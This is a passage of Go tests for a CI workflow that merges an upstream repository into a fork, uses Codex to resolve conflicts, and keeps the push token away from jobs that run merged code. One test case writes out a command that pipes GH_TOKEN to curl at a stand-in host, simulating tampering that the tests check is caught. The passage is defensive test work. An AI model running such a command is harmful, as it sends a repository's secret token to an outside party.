	log := readFile(t, filepath.Join(envValue(t, codexEnv, "RUNNER_TEMP"), "go.log"))
	if !strings.Contains(log, "wasm: go mod download") {
		t.Errorf("Codex has no network, but remerge didn't download api/wasm's modules:\n%s", log)
	}
	_, rest, _ := strings.Cut(readFile(t, syncScript), "\nnormalize() {\n")
	normalize, _, _ := strings.Cut(rest, "\n}\n")
	if !strings.Contains(normalize, "wasm_module go mod tidy") {
		t.Errorf("normalize doesn't tidy api/wasm, whose go.sum follows the root's requirements:\n%s", normalize)
	}
}

func requireGNUSed(t *testing.T) {
	t.Helper()
	out, err := command(t, "", nil, "sed", "--version").CombinedOutput()
	if err != nil || !strings.Contains(string(out), "GNU") {
		t.Skip("translate needs GNU sed, which only the Linux sync job is guaranteed to have")
	}
}

// The guest and host have to agree on the name of the module that holds dlopen,
// and upstream spells it the same way on both sides.
func TestSyncTranslatesGuestAndHostModuleNameAlike(t *testing.T) {
	requireShell(t)
	requireGNUSed(t)
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	writeFile(t, filepath.Join(dir, "go.mod"), "module runtime.link\n")
	writeFile(t, filepath.Join(dir, "guest.go"), "package a\n\n//go:wasmimport runtime.link dlopen\nfunc dlopen()\n")
	writeFile(t, filepath.Join(dir, "host.go"), "package a\n\nconst host = \"runtime.link\"\n")
	git(t, dir, "add", "-A")
	out, err := bashE(t, dir, syncFunctions(t)+"translate\n", "RUNNER_TEMP="+t.TempDir())
	if err != nil {
		t.Fatalf("translate failed: %v\n%s", err, out)
	}
	const module = "github.com/iqhive/runtime.link"
	if guest := readFile(t, filepath.Join(dir, "guest.go")); !strings.Contains(guest, "//go:wasmimport "+module+" dlopen") {
		t.Errorf("guest name wasn't translated:\n%s", guest)
	}
	if host := readFile(t, filepath.Join(dir, "host.go")); !strings.Contains(host, `"`+module+`"`) {
		t.Errorf("host name wasn't translated:\n%s", host)
	}
}

func requireGofmt(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("gofmt"); err != nil {
		t.Skipf("gofmt is not installed: %v", err)
	}
}

// The CI step that sync.sh's checks mirror takes such names
// (TestGofmtStepAcceptsDeletedFilesAndSpacesInNames). A list with one name to
// a line is split by xargs at a space, and git quotes a name that isn't ASCII.
func TestSyncChecksAndFormatsGoFilesWhateverTheirNames(t *testing.T) {
	requireShell(t)
	requireGofmt(t)
	for _, name := range []string{"sub dir/has space.go", "héllo.go", "tab\there.go"} {
		t.Run(name, func(t *testing.T) {
			fork, env := syncRepo(t)
			path := filepath.Join(fork, filepath.FromSlash(name))
			git(t, fork, "rm", "-q", "code.go")
			writeFile(t, path, formattedGo)
			git(t, fork, "add", "-A")
			script := syncFunctions(t) + "\nunmerged() { :; }\n"
			if out, err := bashE(t, fork, script+"checks\n", env...); err != nil {
				t.Fatalf("checks failed on a formatted file: %v\n%s", err, out)
			}

			writeFile(t, path, unformattedGo)
			git(t, fork, "add", "-A")
			out, err := bashE(t, fork, script+"checks\n", env...)
			if err == nil {
				t.Fatalf("checks passed an unformatted file:\n%s", out)
			}
			if want := "not gofmt -s formatted: " + name; !strings.Contains(out, want) {
				t.Fatalf("checks didn't say %q:\n%s", want, out)
			}

			if out, err := bashE(t, fork, script+"normalize\n", env...); err != nil {
				t.Fatalf("normalize failed: %v\n%s", err, out)
			}
			if got := readFile(t, path); got != formattedGo {
				t.Errorf("normalize left the file unformatted:\n%s", got)
			}
		})
	}
}

// syncCommands returns the commands sync.sh's dispatch takes.
func syncCommands(t *testing.T) []string {
	t.Helper()
	_, dispatch, found := strings.Cut(readFile(t, syncScript), "\ncase \"${1:-}\" in\n")
	if !found {
		t.Fatalf("%s no longer ends in the dispatch this test reads", syncScript)
	}
	var commands []string
	for _, match := range regexp.MustCompile(`(?m)^([a-z-]+)\) `).FindAllStringSubmatch(dispatch, -1) {
		commands = append(commands, match[1])
	}
	return commands
}

// recordingGo is a go command that records that it ran.
const recordingGo = "#!/bin/sh\necho \"$*\" >>\"$RUNNER_TEMP/fake-go.log\"\n"

// Only finalize and save-failed are for the job with the token. Every other
// command belongs to a job that builds or tests the merged tree, and stops
// before it does anything if a change to the workflow hands it the token.
func TestSyncCommandsOfJobsThatRunMergedCodeRefuseTheToken(t *testing.T) {
	requireShell(t)
	script, err := filepath.Abs(syncScript)
	if err != nil {
		t.Fatal(err)
	}
	bin := t.TempDir()
	writeFile(t, filepath.Join(bin, "go"), recordingGo)
	if err := os.Chmod(filepath.Join(bin, "go"), 0o755); err != nil {
		t.Fatal(err)
	}
	commands := syncCommands(t)
	for _, pushes := range []string{"finalize", "save-failed"} {
		if !slices.Contains(commands, pushes) {
			t.Fatalf("sync.sh has no %s among %v", pushes, commands)
		}
	}
	if len(commands) < 3 {
		t.Fatalf("found no command besides the two that push: %v", commands)
	}
	for _, name := range commands {
		if name == "finalize" || name == "save-failed" {
			continue
		}
		t.Run(name, func(t *testing.T) {
			fork, env := syncRepo(t)
			head := git(t, fork, "rev-parse", "HEAD")
			refs := git(t, fork, "for-each-ref")
			out, err := command(t, fork, append(env,
				"PATH="+bin+string(os.PathListSeparator)+os.Getenv("PATH"),
				"GH_TOKEN=the-push-token",
				"UPSTREAM="+head,
				"BASE="+head,
			), "bash", script, name).CombinedOutput()
			if err == nil {
				t.Fatalf("sync.sh %s ran with the push token in its environment:\n%s", name, out)
			}
			if !strings.Contains(string(out), "must not be given GH_TOKEN") {
				t.Fatalf("sync.sh %s failed for another reason: %v\n%s", name, err, out)
			}
			if ran, err := os.ReadFile(filepath.Join(envValue(t, env, "RUNNER_TEMP"), "fake-go.log")); err == nil {
				t.Errorf("sync.sh %s ran go before it refused:\n%s", name, ran)
			}
			if after := git(t, fork, "for-each-ref"); after != refs {
				t.Errorf("sync.sh %s changed the repository before it refused:\n%s", name, after)
			}
			if status := git(t, fork, "status", "--porcelain"); status != "" {
				t.Errorf("sync.sh %s changed the checkout before it refused:\n%s", name, status)
			}
		})
	}
}

// plainMerge makes the sync job's steps runnable anywhere. merge_translated
// needs GNU sed, and the test's upstream already uses the fork's names, so a
// plain merge leaves what it would, conflicts included. changed_go is replaced
// so that the checks don't need gofmt. push adds the token as a header with
// GNU base64, which the test's origin has no use for.
const plainMerge = `
merge_translated() { git merge -q --no-commit --no-ff "$2" || [ -n "$(unmerged)" ]; }
changed_go() { :; }
push() { git push -q "$@"; }
`

// pushableOrigin gives the fork an origin that takes pushes and holds the
// fork's main.
func pushableOrigin(t *testing.T, fork string) string {
	t.Helper()
	origin := filepath.Join(t.TempDir(), "origin.git")
	git(t, fork, "clone", "-q", "--bare", ".", origin)
	git(t, fork, "remote", "set-url", "origin", origin)
	git(t, fork, "fetch", "-q", "origin")
	return origin
}

// nextJob returns a fresh checkout of origin's main, which is what a later job
// of the workflow starts from, and that job's variables.
func nextJob(t *testing.T, origin string) (dir string, env []string) {
	t.Helper()
	dir = filepath.Join(t.TempDir(), "checkout")
	git(t, filepath.Dir(dir), "clone", "-q", origin, dir)
	temp := t.TempDir()
	return dir, []string{
		"RUNNER_TEMP=" + temp,
		"GITHUB_OUTPUT=" + filepath.Join(temp, "output"),
		"GITHUB_STEP_SUMMARY=" + filepath.Join(temp, "summary"),
	}
}

// download gives a job the named artifact where the workflow's download step
// unpacks it. The files are the ones an earlier job uploaded, taken from the
// directory it had them in: one that the job never made is not in its
// artifact.
func download(t *testing.T, job string, env []string, artifact, from string, files ...string) {
	t.Helper()
	into := filepath.Join(envValue(t, env, "RUNNER_TEMP"), artifactDir(t, job, artifact))
	for _, name := range files {
		data, err := os.ReadFile(filepath.Join(from, name))
		if err != nil {
			continue
		}
		writeFile(t, filepath.Join(into, name), string(data))
	}
}

// pushJob runs a command of the push job, which is the one given the token,
// on a fresh checkout. The named files are the merge-result artifact, taken
// from the temp directory of the job that uploaded it.
func pushJob(t *testing.T, origin, from, call string, artifact ...string) (dir string, env []string, out string, err error) {
	t.Helper()
	dir, env = nextJob(t, origin)
	download(t, "push", env, "merge-result", from, artifact...)
	out, err = bashE(t, dir, syncFunctions(t)+plainMerge+call+"\n", append(env, "GH_TOKEN=the-push-token")...)
	return dir, env, out, err
}

// verifyJob runs the verify job on what the codex job packaged.
func verifyJob(t *testing.T, origin string, codexEnv []string, stubs, upstream string) (dir string, env []string, out string, err error) {
	t.Helper()
	dir, env = nextJob(t, origin)
	env = append(env, "UPSTREAM="+upstream)
	download(t, "verify", env, "codex-result", envValue(t, codexEnv, "RUNNER_TEMP"), "merge.bundle", "codex-summary.md")
	out, err = bashE(t, dir, syncFunctions(t)+plainMerge+stubs+"verify\n", env...)
	return dir, env, out, err
}

// ranNoMergedCode fails the test if the push job ran go, or wrote the merged
// tree's files where something could run them.
func ranNoMergedCode(t *testing.T, dir string, env []string, main string) {
	t.Helper()
	if ran, err := os.ReadFile(filepath.Join(envValue(t, env, "RUNNER_TEMP"), "go.log")); err == nil {
		t.Errorf("the job with the token ran go:\n%s", ran)
	}
	if head := git(t, dir, "rev-parse", "HEAD"); head != main {
		t.Errorf("the job with the token checked out %s; it started on main %s", head, main)
	}
	if status := git(t, dir, "status", "--porcelain"); status != "" {
		t.Errorf("the job with the token changed its checkout:\n%s", status)
	}
	if code := readFile(t, filepath.Join(dir, "code.go")); strings.TrimSpace(code) != git(t, dir, "show", main+":code.go") {
		t.Errorf("the job with the token has the merged code.go in its checkout:\n%s", code)
	}
}

func branches(t *testing.T, repo string) string {
	t.Helper()
	return git(t, repo, "for-each-ref", "--format=%(refname:short) %(objectname)", "refs/heads")
}

func TestSyncPushesACleanMergeFromTheJobWithTheToken(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	main := git(t, fork, "rev-parse", "main")
	// What an earlier failed run left, which a merge that goes in clears away.
	git(t, fork, "push", "-q", "origin", "main:refs/heads/qqmerge-failed")
	before := branches(t, origin)

	out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n", env...)
	if err != nil {
		t.Fatalf("the sync job failed: %v\n%s", err, out)
	}
	if !strings.Contains(readFile(t, envValue(t, env, "GITHUB_OUTPUT")), "needs_codex=false") {
		t.Fatalf("prepare asked for Codex on a clean merge:\n%s", out)
	}
	if log := readFile(t, filepath.Join(envValue(t, env, "RUNNER_TEMP"), "go.log")); !strings.Contains(log, "go test -race ./...") {
		t.Fatalf("the sync job never tested the merge:\n%s", log)
	}
	if after := branches(t, origin); after != before {
		t.Fatalf("the sync job, which has no token, pushed:\n%s", after)
	}
	merged := git(t, fork, "rev-parse", "qqmerge")
	upstream := git(t, fork, "rev-parse", "quaadgras/main")

	dir, pushEnv, out, err := pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
	if err != nil {
		t.Fatalf("finalize failed: %v\n%s", err, out)
	}
	if got, want := branches(t, origin), "main "+merged+"\nqqmerge "+merged; got != want {
		t.Errorf("origin's branches are\n%s\nwant\n%s", got, want)
	}
	if parents := git(t, origin, "rev-list", "--parents", "-n1", "main"); parents != merged+" "+main+" "+upstream {
		t.Errorf("main is %s, want a merge of upstream %s into %s", parents, upstream, main)
	}
	if summary := readFile(t, envValue(t, pushEnv, "GITHUB_STEP_SUMMARY")); !strings.Contains(summary, "Merged quaadgras/main "+upstream[:7]+" into qqmerge and main.") {
		t.Errorf("the summary doesn't name the upstream commit:\n%s", summary)
	}
	ranNoMergedCode(t, dir, pushEnv, main)
}

func TestSyncPushesWhatTheVerifyJobChecked(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	main := git(t, fork, "rev-parse", "main")
	before := branches(t, origin)

	syncJobAsksForCodex(t, fork, append(env, "FORCE_CODEX=true"), plainMerge)
	if _, err := os.Stat(filepath.Join(envValue(t, env, "RUNNER_TEMP"), "merged.bundle")); err == nil {
		t.Fatal("the sync job bundled a merge that Codex has yet to see")
	}
	upstream := git(t, fork, "rev-parse", "quaadgras/main")

	const codex = "echo 'var Z = 3' >>code.go\necho 'What Codex did.' >\"$RUNNER_TEMP/codex-summary.md\"\n"
	codexDir, codexEnv, out, err := codexJob(t, origin, append(env, "FORCE_CODEX=true"), plainMerge, codex, "package_result\n")
	if err != nil {
		t.Fatalf("the codex job failed: %v\n%s", err, out)
	}
	codexTemp := envValue(t, codexEnv, "RUNNER_TEMP")
	if prompt := readFile(t, filepath.Join(codexTemp, "codex-prompt.md")); !strings.Contains(prompt, "a Codex pass was requested for this run") {
		t.Errorf("the prompt doesn't say why Codex was called:\n%s", prompt)
	}
	// The log is what the sync job's checks printed: this job runs none.
	if log := readFile(t, filepath.Join(codexDir, ".git", "upstream-sync.log")); log != readFile(t, filepath.Join(fork, ".git", "upstream-sync.log")) {
		t.Errorf("Codex was given another log than the sync job's:\n%s", log)
	}
	if after := branches(t, origin); after != before {
		t.Fatalf("the sync and codex jobs, which have no token, pushed:\n%s", after)
	}

	verifyDir, verifyEnv, out, err := verifyJob(t, origin, codexEnv, "", upstream)
	if err != nil {
		t.Fatalf("the verify job failed: %v\n%s", err, out)
	}
	verifyTemp := envValue(t, verifyEnv, "RUNNER_TEMP")
	if log := readFile(t, filepath.Join(verifyTemp, "go.log")); !strings.Contains(log, "go test -race ./...") {
		t.Fatalf("the verify job never tested the merge:\n%s", log)
	}
	if after := branches(t, origin); after != before {
		t.Fatalf("the verify job, which has no token, pushed:\n%s", after)
	}
	merged := git(t, verifyDir, "rev-parse", "qqmerge")

	dir, pushEnv, out, err := pushJob(t, origin, verifyTemp, "finalize", "merged.bundle", "codex-summary.md")
	if err != nil {
		t.Fatalf("finalize failed: %v\n%s", err, out)
	}
	if got, want := branches(t, origin), "main "+merged+"\nqqmerge "+merged; got != want {
		t.Errorf("origin's branches are\n%s\nwant\n%s", got, want)
	}
	if code := git(t, origin, "show", "main:code.go"); !strings.Contains(code, "var Y = 2") || !strings.Contains(code, "var Z = 3") {
		t.Errorf("main's code.go lacks upstream's change or Codex's:\n%s", code)
	}
	if message := git(t, origin, "log", "-n1", "--format=%B", "main"); !strings.Contains(message, "What Codex did.") {
		t.Errorf("the merge commit doesn't carry Codex's summary:\n%s", message)
	}
	if summary := readFile(t, envValue(t, pushEnv, "GITHUB_STEP_SUMMARY")); !strings.Contains(summary, "What Codex did.") {
		t.Errorf("the job summary doesn't carry Codex's summary:\n%s", summary)
	}
	ranNoMergedCode(t, dir, pushEnv, main)
}

// goCommands returns what a job ran of go, one command to a line, without the
// directory it ran in.
func goCommands(t *testing.T, env []string) []string {
	t.Helper()
	log, err := os.ReadFile(filepath.Join(envValue(t, env, "RUNNER_TEMP"), "go.log"))
	if err != nil {
		return nil // the job ran no go at all
	}
	var commands []string
	for _, line := range strings.Split(strings.TrimSpace(string(log)), "\n") {
		_, command, _ := strings.Cut(line, ": ")
		commands = append(commands, command)
	}
	return commands
}

// conflictingFork returns a fork whose main changes the line that upstream
// has changed since, with an origin to push to.
func conflictingFork(t *testing.T) (fork string, env []string, origin string) {
	t.Helper()
	fork, env = syncRepo(t)
	writeFile(t, filepath.Join(fork, "code.go"), formattedGo+"\nvar Y = 1\n")
	git(t, fork, "add", "-A")
	git(t, fork, "commit", "-q", "-m", "the fork's own Y")
	return fork, env, pushableOrigin(t, fork)
}

// The codex job is given the OpenAI key, so until Codex runs it may run
// nothing of the merged tree: no build, no vet and no test, whether the sync
// job's merge conflicted or failed its checks. Downloading modules and tidying
// go.mod run none of their code.
func TestRemergeRunsNothingFromTheMergedTree(t *testing.T) {
	requireShell(t)
	harmless := regexp.MustCompile(`^go mod (download|tidy)$`)
	check := func(t *testing.T, env []string) {
		t.Helper()
		commands := goCommands(t, env)
		for _, command := range commands {
			if !harmless.MatchString(command) {
				t.Errorf("the job that is given the OpenAI key ran %q before Codex", command)
			}
		}
		if !slices.Contains(commands, "go mod download") {
			t.Errorf("remerge downloaded no modules for Codex, which has no network: %v", commands)
		}
	}

	t.Run("checks failed", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		const failingTests = `go() { echo "$(basename "$PWD"): go $*" >>"$RUNNER_TEMP/go.log"; [ "$1" != test ]; }` + "\n"
		syncJobAsksForCodex(t, fork, env, plainMerge+failingTests)
		if ran := goCommands(t, env); !slices.Contains(ran, "go test -race ./...") {
			t.Fatalf("the sync job never tested the clean merge: %v", ran)
		}
		dir, codexEnv, out, err := codexJob(t, origin, env, plainMerge, "", "")
		if err != nil {
			t.Fatalf("remerge failed: %v\n%s", err, out)
		}
		check(t, codexEnv)
		if status := git(t, dir, "status", "--porcelain"); !strings.Contains(status, "code.go") {
			t.Errorf("remerge left no merge for Codex to work on:\n%s", status)
		}
		prompt := readFile(t, filepath.Join(envValue(t, codexEnv, "RUNNER_TEMP"), "codex-prompt.md"))
		if !strings.Contains(prompt, "the merge was clean but the checks failed; their output is in .git/upstream-sync.log") {
			t.Errorf("the prompt doesn't say why Codex was called:\n%s", prompt)
		}
	})

	t.Run("conflict", func(t *testing.T) {
		fork, env, origin := conflictingFork(t)
		syncJobAsksForCodex(t, fork, env, plainMerge)
		// A merge that conflicted can't be built, so the sync job hasn't
		// checked it either.
		for _, command := range goCommands(t, env) {
			if !harmless.MatchString(command) {
				t.Errorf("the sync job ran %q on a merge with conflicts", command)
			}
		}
		dir, codexEnv, out, err := codexJob(t, origin, env, plainMerge, "", "")
		if err != nil {
			t.Fatalf("remerge failed: %v\n%s", err, out)
		}
		check(t, codexEnv)
		if unmerged := git(t, dir, "diff", "--name-only", "--diff-filter=U"); unmerged != "code.go" {
			t.Errorf("remerge left the conflicts %q for Codex, want code.go", unmerged)
		}
		prompt := readFile(t, filepath.Join(envValue(t, codexEnv, "RUNNER_TEMP"), "codex-prompt.md"))
		if !strings.Contains(prompt, "the merge conflicted in: code.go.") {
			t.Errorf("the prompt doesn't name the conflict:\n%s", prompt)
		}
		if log := readFile(t, filepath.Join(dir, ".git", "upstream-sync.log")); !strings.Contains(log, "Conflicted files:\ncode.go") {
			t.Errorf("the log Codex reads doesn't list the conflict:\n%s", log)
		}
	})
}

// Between the two jobs someone may have merged upstream by hand. There is
// then nothing for Codex to do, and no reason to pay for it.
func TestRemergeStopsWhenMainAlreadyHasUpstream(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	syncJobAsksForCodex(t, fork, append(env, "FORCE_CODEX=true"), plainMerge)
	other, _ := nextJob(t, origin)
	git(t, other, "pull", "-q", "--no-rebase", "--no-edit", envValue(t, env, "UPSTREAM_URL"), "main")
	git(t, other, "push", "-q", "origin", "main")

	_, codexEnv, out, err := codexJob(t, origin, env, plainMerge, "", "")
	if err == nil || !strings.Contains(out, "main already has quaadgras/main") {
		t.Fatalf("remerge went on with nothing to merge: %v\n%s", err, out)
	}
	if _, err := os.Stat(filepath.Join(envValue(t, codexEnv, "RUNNER_TEMP"), "codex-prompt.md")); err == nil {
		t.Error("remerge wrote a prompt for Codex all the same")
	}
}

func TestSyncSavesAFailedAttemptFromTheJobWithTheToken(t *testing.T) {
	requireShell(t)
	// failingTests is a go whose tests fail, after the stub syncFunctions adds.
	const failingTests = `go() { [ "$1" != test ]; }` + "\n"

	saved := func(t *testing.T, origin, from, main, failed, upstream string) {
		t.Helper()
		dir, pushEnv, out, err := pushJob(t, origin, from, "save_failed", "failed.bundle")
		if err != nil {
			t.Fatalf("save-failed failed: %v\n%s", err, out)
		}
		if got, want := branches(t, origin), "main "+main+"\nqqmerge-failed "+failed; got != want {
			t.Errorf("origin's branches are\n%s\nwant\n%s", got, want)
		}
		if parents := git(t, origin, "rev-list", "--parents", "-n1", "qqmerge-failed"); parents != failed+" "+main+" "+upstream {
			t.Errorf("qqmerge-failed is %s, want a merge of upstream %s into %s, which scheduled runs then skip", parents, upstream, main)
		}
		ranNoMergedCode(t, dir, pushEnv, main)
	}

	// The job fails with the merge made: here go mod tidy can't reach the
	// network.
	t.Run("sync job", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		main := git(t, fork, "rev-parse", "main")
		const offline = `go() { [ "$2" != tidy ]; }` + "\n"
		if out, err := bashE(t, fork, syncFunctions(t)+plainMerge+offline+"prepare\n", env...); err == nil {
			t.Fatalf("prepare went on after go mod tidy failed:\n%s", out)
		}
		upstream := git(t, fork, "rev-parse", "quaadgras/main")
		out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"package_failed\n", append(env, "UPSTREAM="+upstream)...)
		if err != nil {
			t.Fatalf("the sync job couldn't bundle its attempt: %v\n%s", err, out)
		}
		if after := branches(t, origin); after != "main "+main {
			t.Fatalf("the sync job, which has no token, pushed:\n%s", after)
		}
		failed := git(t, fork, "rev-parse", "HEAD")
		saved(t, origin, envValue(t, env, "RUNNER_TEMP"), main, failed, upstream)
		if subject := git(t, origin, "log", "-n1", "--format=%s", "qqmerge-failed"); !strings.HasPrefix(subject, "WIP: failed merge of quaadgras/main "+upstream[:7]) {
			t.Errorf("qqmerge-failed's commit is %q", subject)
		}
	})

	// Codex is called and its step fails, with the merge still in progress.
	t.Run("codex job", func(t *testing.T) {
		fork, env, origin := conflictingFork(t)
		main := git(t, fork, "rev-parse", "main")
		syncJobAsksForCodex(t, fork, env, plainMerge)
		upstream := git(t, fork, "rev-parse", "quaadgras/main")
		dir, codexEnv, out, err := codexJob(t, origin, env, plainMerge, "", "package_failed\n")
		if err != nil {
			t.Fatalf("the codex job couldn't bundle its attempt: %v\n%s", err, out)
		}
		if after := branches(t, origin); after != "main "+main {
			t.Fatalf("the codex job, which has no token, pushed:\n%s", after)
		}
		failed := git(t, dir, "rev-parse", "HEAD")
		saved(t, origin, envValue(t, codexEnv, "RUNNER_TEMP"), main, failed, upstream)
		if code := git(t, origin, "show", "qqmerge-failed:code.go"); !strings.Contains(code, "<<<<<<<") {
			t.Errorf("the saved attempt doesn't show the conflict Codex was left with:\n%s", code)
		}
	})

	t.Run("verify job", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		main := git(t, fork, "rev-parse", "main")
		forced := append(env, "FORCE_CODEX=true")
		syncJobAsksForCodex(t, fork, forced, plainMerge)
		upstream := git(t, fork, "rev-parse", "quaadgras/main")
		_, codexEnv, out, err := codexJob(t, origin, forced, plainMerge, "", "package_result\n")
		if err != nil {
			t.Fatalf("the codex job failed: %v\n%s", err, out)
		}

		verifyDir, verifyEnv, out, err := verifyJob(t, origin, codexEnv, failingTests, upstream)
		if err == nil || !strings.Contains(out, "The checks still fail after Codex.") {
			t.Fatalf("verify passed a merge whose tests fail: %v\n%s", err, out)
		}
		verifyTemp := envValue(t, verifyEnv, "RUNNER_TEMP")
		if _, err := os.Stat(filepath.Join(verifyTemp, "merged.bundle")); err == nil {
			t.Fatal("verify bundled a merge whose tests fail for the push job")
		}
		if out, err := bashE(t, verifyDir, syncFunctions(t)+plainMerge+"package_failed\n", verifyEnv...); err != nil {
			t.Fatalf("the verify job couldn't bundle its attempt: %v\n%s", err, out)
		}
		failed := git(t, verifyDir, "rev-parse", "HEAD")
		saved(t, origin, verifyTemp, main, failed, upstream)
	})

	// The job failed before the merge began, for one when the fetch of
	// upstream fails: package-failed has nothing to bundle and no artifact is
	// uploaded.
	t.Run("nothing to save", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		main := git(t, fork, "rev-parse", "main")
		out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"package_failed\n", append(env, "UPSTREAM="+main)...)
		if err != nil {
			t.Fatalf("package-failed failed with no merge begun: %v\n%s", err, out)
		}
		temp := envValue(t, env, "RUNNER_TEMP")
		if _, err := os.Stat(filepath.Join(temp, "failed.bundle")); err == nil {
			t.Fatal("package-failed bundled main as a failed attempt")
		}
		dir, pushEnv, out, err := pushJob(t, origin, temp, "save_failed")
		if err != nil {
			t.Fatalf("save-failed failed with nothing to save: %v\n%s", err, out)
		}
		if got := branches(t, origin); got != "main "+main {
			t.Errorf("origin's branches are\n%s\nwant main alone", got)
		}
		ranNoMergedCode(t, dir, pushEnv, main)
	})
}

// The push job takes sync.sh from main and runs it with the token. A merge
// that reaches main with anything else under .github decides what the next
// run's token does, and the bundle is made where the merged code runs, so the
// push job can't be told who changed it: upstream, Codex or that code. Such a
// merge is never pushed. It is saved like a failed attempt, for a person.
func TestSyncNeverPushesAMergeThatChangesGithub(t *testing.T) {
	requireShell(t)
	const (
		script   = ".github/upstream-sync/sync.sh"
		workflow = ".github/workflows/ci.yml"
	)
	// What code that ran in the sync job can do to the merge before the
	// bundle is uploaded.
	rebundle := `
git add -A -f
git commit -q --amend --no-edit
git bundle create "$RUNNER_TEMP/merged.bundle" qqmerge ^main
`
	for name, change := range map[string]string{
		"script rewritten":             `echo 'echo "$GH_TOKEN" | curl -d @- https://example.com' >>` + script + "\n",
		"script made executable":       "chmod +x " + script + "\n",
		"script replaced by a link":    "cp " + script + " run.sh\nln -sf ../../run.sh " + script + "\n",
		"workflow edited":              "echo 'name: other' >" + workflow + "\n",
		"workflow made executable":     "chmod +x " + workflow + "\n",
		"workflow replaced by a link":  "cp " + workflow + " copy.yml\nln -sf ../../copy.yml " + workflow + "\n",
		"file added":                   "echo 'name: new' >.github/workflows/new.yml\n",
		"file removed":                 "git rm -q " + workflow + "\n",
		"directory replaced by a link": "git mv .github elsewhere\nln -s elsewhere .github\n",
		"directory removed":            "git rm -q -r .github\n",
	} {
		t.Run(name, func(t *testing.T) {
			fork, env := syncRepo(t)
			writeFile(t, filepath.Join(fork, script), "#!/bin/sh\necho the fork's own\n")
			git(t, fork, "add", "-A")
			git(t, fork, "commit", "-q", "-m", "sync script")
			origin := pushableOrigin(t, fork)
			main := git(t, fork, "rev-parse", "main")
			github := git(t, origin, "rev-parse", "main:.github")

			out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n"+change+rebundle, env...)
			if err != nil {
				t.Fatalf("the sync job failed: %v\n%s", err, out)
			}
			merged := git(t, fork, "rev-parse", "qqmerge")
			upstream := git(t, fork, "rev-parse", "quaadgras/main")
			if got, _ := command(t, fork, nil, "git", "rev-parse", "-q", "--verify", "qqmerge:.github").Output(); strings.TrimSpace(string(got)) == github {
				t.Fatalf("the test's merge has the same .github as main")
			}

			dir, pushEnv, out, err := pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
			if err == nil {
				t.Errorf("finalize succeeded on a merge that changes .github:\n%s", out)
			}
			if !strings.Contains(out, "a person must review it") {
				t.Errorf("finalize didn't say that a person must review the merge:\n%s", out)
			}
			if summary := readFile(t, envValue(t, pushEnv, "GITHUB_STEP_SUMMARY")); !strings.Contains(summary, "changes .github") || !strings.Contains(summary, "It is on branch qqmerge-failed.") {
				t.Errorf("the job summary doesn't say what happened to the merge:\n%s", summary)
			}
			if got, want := branches(t, origin), "main "+main+"\nqqmerge-failed "+merged; got != want {
				t.Errorf("origin's branches are\n%s\nwant main where it was and the merge on qqmerge-failed:\n%s", got, want)
			}
			if after := git(t, origin, "rev-parse", "main:.github"); after != github {
				t.Errorf("main's .github changed:\n%s", git(t, origin, "ls-tree", "-r", "main", ".github"))
			}
			ranNoMergedCode(t, dir, pushEnv, main)
			if _, err := os.Lstat(filepath.Join(dir, "run.sh")); err == nil {
				t.Error("the job with the token has the merge's files in its checkout")
			}

			// Scheduled runs leave the merge alone until upstream moves.
			next, nextEnv := nextJob(t, origin)
			nextEnv = append(nextEnv, "UPSTREAM_URL="+envValue(t, env, "UPSTREAM_URL"), "GITHUB_EVENT_NAME=schedule")
			if out, err := bashE(t, next, syncFunctions(t)+plainMerge+"prepare\n", nextEnv...); err != nil {
				t.Fatalf("the next scheduled run failed: %v\n%s", err, out)
			}
			if outputs := readFile(t, envValue(t, nextEnv, "GITHUB_OUTPUT")); !strings.Contains(outputs, "pending=false") {
				t.Errorf("the next scheduled run tried the merge of %s again:\n%s", upstream, outputs)
			}
		})
	}
}

// Upstream has workflows of its own, and a merge that brings a change of
// theirs in is the plain way for .github to change. It is held like any other.
func TestSyncHoldsAnUpstreamChangeToGithubForReview(t *testing.T) {
	requireShell(t)
	const workflow = ".github/workflows/ci.yml"
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	main := git(t, fork, "rev-parse", "main")
	upstream := envValue(t, env, "UPSTREAM_URL")
	writeFile(t, filepath.Join(upstream, filepath.FromSlash(workflow)), "name: upstream's new\n")
	git(t, upstream, "add", "-A")
	git(t, upstream, "commit", "-q", "-m", "upstream changes its workflow")

	out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n", env...)
	if err != nil {
		t.Fatalf("the sync job failed: %v\n%s", err, out)
	}
	merged := git(t, fork, "rev-parse", "qqmerge")
	_, _, out, err = pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
	if err == nil || !strings.Contains(out, "a person must review it") {
		t.Fatalf("finalize didn't hold a merge in which upstream changed .github: %v\n%s", err, out)
	}
	if !strings.Contains(out, workflow) {
		t.Errorf("finalize didn't name the file that changed:\n%s", out)
	}
	if got, want := branches(t, origin), "main "+main+"\nqqmerge-failed "+merged; got != want {
		t.Errorf("origin's branches are\n%s\nwant\n%s", got, want)
	}
	if got := git(t, origin, "show", "qqmerge-failed:"+workflow); got != "name: upstream's new" {
		t.Errorf("the merge saved for review has %q for the workflow", got)
	}
}

// A bundle can carry tags, and git takes a short name such as origin/main or
// qqmerge for a tag before a branch. The push job's checks would then be made
// on a commit that the bundle chose, and not on main and the merge.
func TestSyncChecksTheBundledBranchWhateverTagsComeWithIt(t *testing.T) {
	requireShell(t)
